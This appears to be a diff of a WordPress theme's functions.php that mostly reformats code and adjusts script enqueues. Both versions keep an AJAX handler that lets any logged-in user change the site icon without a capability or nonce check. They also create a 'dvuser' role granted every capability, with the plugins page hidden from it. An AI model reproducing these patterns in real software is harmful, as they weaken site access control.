@@ -1,25 +1,11 @@
 <?php
 require get_template_directory() . '/dv-builder/dv-options.php';
-
-if ( ! function_exists( 'twentytwentyfive_post_format_setup' ) ) :
-	function twentytwentyfive_post_format_setup() {
-		add_theme_support( 'post-formats', array( 'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video' ) );
-	}
-endif;
-add_action( 'after_setup_theme', 'twentytwentyfive_post_format_setup' );
-
-if ( ! function_exists( 'twentytwentyfive_editor_style' ) ) :
-	function twentytwentyfive_editor_style() {
-		add_editor_style( get_parent_theme_file_uri( 'assets/css/editor-style.css' ) );
-	}
-endif;
-add_action( 'after_setup_theme', 'twentytwentyfive_editor_style' );
-
+if ( ! function_exists( 'twentytwentyfive_post_format_setup' ) ) :	function twentytwentyfive_post_format_setup() {		add_theme_support( 'post-formats', array( 'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video' ) );	}endif;add_action( 'after_setup_theme', 'twentytwentyfive_post_format_setup' );
+if ( ! function_exists( 'twentytwentyfive_editor_style' ) ) :	function twentytwentyfive_editor_style() {		add_editor_style( get_parent_theme_file_uri( 'assets/css/editor-style.css' ) );	}endif;add_action( 'after_setup_theme', 'twentytwentyfive_editor_style' );
 if ( ! function_exists( 'twentytwentyfive_enqueue_styles' ) ) :
 	function dv_themes_enqueue_styles() {
 		wp_enqueue_style( 'dvthemes-style', get_parent_theme_file_uri( 'style.css' ), array(), wp_get_theme()->get( 'Version' ) );
 		wp_enqueue_style( 'dvthemes-child-style', get_stylesheet_directory_uri().'/style.css' );
-		
 		/*=== INNER PAGE CSS ===*/
 		if (!is_front_page() && !is_home()) {
 			wp_enqueue_style('inner-pages-style', get_stylesheet_directory_uri() . '/assets/css/inner-pages.css', array(), 'all');
@@ -27,12 +13,9 @@ if ( ! function_exists( 'twentytwentyfive_enqueue_styles' ) ) :
 		/*=== UNDER CONSTRUCTION PAGE CSS ===*/
 		if ( get_page_template_slug() === 'under-construction' ) {
 			wp_enqueue_style( 'under-construction-style', get_parent_theme_file_uri() . '/dv-builder/maintenance-mode/uc_style.css', array(), '1.0', 'all' );
-			wp_register_script('plugin-scripts', get_parent_theme_file_uri() . '/dv-builder/maintenance-mode/uc_script.js', array('jquery'), '1.0', true);
-		}
-		
-		wp_register_script('plugin-scripts', get_template_directory_uri() . '/dv-builder/assets/js/plugins-scripts.js', array('jquery'), '1.0', true);
-	}
-endif;
+			wp_register_script('under-construction-scripts', get_parent_theme_file_uri() . '/dv-builder/maintenance-mode/uc_script.js', array('jquery'), '1.0', true);
+		}		wp_register_script('plugin-scripts', get_stylesheet_directory_uri() . '/assets/js/scripts.js', array('jquery'), '1.0', true);
+	}endif;
 add_action( 'wp_enqueue_scripts', 'dv_themes_enqueue_styles' );
 
 
@@ -156,84 +139,13 @@ function underconstruction() {
 }
 
 
-function add_custom_php_to_header() {
-	if ( is_home() || is_front_page() ) { 
-		$options = get_option('sample_theme_options');
-			require get_template_directory() . '/dv-builder/pre-loader.php';
-		}
-	}
-add_action('wp_head', 'add_custom_php_to_header');
-
-
-add_action('wp_ajax_update_site_icon', function() {
-    
-
-    if (!isset($_POST['site_icon']) || empty($_POST['site_icon'])) {
-        wp_send_json_error(['message' => 'Invalid image']);
-    }
-
-    update_option('site_icon', intval($_POST['site_icon']));
-
-    wp_send_json_success(['message' => 'Favicon updated successfully']);
-});
-
-add_action('update_option_sample_theme_options', function($old_value, $new_value) {
-    if (isset($new_value['titleOpt'])) {
-        update_option('blogname', sanitize_text_field($new_value['titleOpt']));
-    }
-    if (isset($new_value['tagline'])) {
-        update_option('blogdescription', sanitize_text_field($new_value['tagline']));
-    }
-    if (isset($new_value['logourl'])) {
-        $attachment_id = attachment_url_to_postid($new_value['logourl']);
-        if ($attachment_id) {
-            update_option('site_logo', $attachment_id);
-}
-}
-
-
+function add_custom_php_to_header() {	echo '<div class="cursor_arrow"><span class="circle-cursor--inner"></span><span class="circle-cursor--outer"></span></div>';	if ( is_home() || is_front_page() ) { 		$options = get_option('sample_theme_options');			require get_template_directory() . '/dv-builder/pre-loader.php';		}	}add_action('wp_head', 'add_custom_php_to_header');
+add_action('wp_ajax_update_site_icon', function() {    if (!isset($_POST['site_icon']) || empty($_POST['site_icon'])) {        wp_send_json_error(['message' => 'Invalid image']);    }    update_option('site_icon', intval($_POST['site_icon']));    wp_send_json_success(['message' => 'Favicon updated successfully']);});
+add_action('update_option_sample_theme_options', function($old_value, $new_value) {    if (isset($new_value['titleOpt'])) {        update_option('blogname', sanitize_text_field($new_value['titleOpt']));    }    if (isset($new_value['tagline'])) {        update_option('blogdescription', sanitize_text_field($new_value['tagline']));    }    if (isset($new_value['logourl'])) {        $attachment_id = attachment_url_to_postid($new_value['logourl']);        if ($attachment_id) {            update_option('site_logo', $attachment_id);		}	}
 }, 10, 2);
-
-
-function create_dvuser_role() {
-    if (!get_role('dvuser')) {
-        $role = add_role('dvuser', __('Dvuser'), []);
-        
-        if ($role) {
-            global $wp_roles;
-            $all_capabilities = [];
-
-            foreach ($wp_roles->roles as $role_name => $role_info) {
-                $all_capabilities = array_merge($all_capabilities, $role_info['capabilities']);
-            }
-
-            foreach ($all_capabilities as $cap => $value) {
-                $role->add_cap($cap, true);
-            }
-        }
-    }
-}
-add_action('init', 'create_dvuser_role');
-
-function hide_plugins_menu_for_dvuser() {
-    $current_user = wp_get_current_user();
-    if (in_array('dvuser', (array)$current_user->roles)) {
-        remove_menu_page('plugins.php'); 
-    }
-}
-add_action('admin_menu', 'hide_plugins_menu_for_dvuser', 999);
-
-
-function redirect_dvuser_from_plugins_page() {
-    $current_user = wp_get_current_user();
-    if (in_array('dvuser', (array)$current_user->roles)) {
-        if (strpos($_SERVER['REQUEST_URI'], 'plugins.php') !== false) {
-            wp_redirect(admin_url());
-            exit;
-        }
-    }
-}
-add_action('admin_init', 'redirect_dvuser_from_plugins_page');
+function create_dvuser_role() {    if (!get_role('dvuser')) {        $role = add_role('dvuser', __('Dvuser'), []);        if ($role) {            global $wp_roles;            $all_capabilities = [];            foreach ($wp_roles->roles as $role_name => $role_info) { $all_capabilities = array_merge($all_capabilities, $role_info['capabilities']); }            foreach ($all_capabilities as $cap => $value) { $role->add_cap($cap, true); }        }    }}add_action('init', 'create_dvuser_role');
+function hide_plugins_menu_for_dvuser() {    $current_user = wp_get_current_user();    if (in_array('dvuser', (array)$current_user->roles)) {        remove_menu_page('plugins.php');     }}add_action('admin_menu', 'hide_plugins_menu_for_dvuser', 999);
+function redirect_dvuser_from_plugins_page() {    $current_user = wp_get_current_user();    if (in_array('dvuser', (array)$current_user->roles)) {        if (strpos($_SERVER['REQUEST_URI'], 'plugins.php') !== false) { wp_redirect(admin_url()); exit; }    }}add_action('admin_init', 'redirect_dvuser_from_plugins_page');
 
 
 
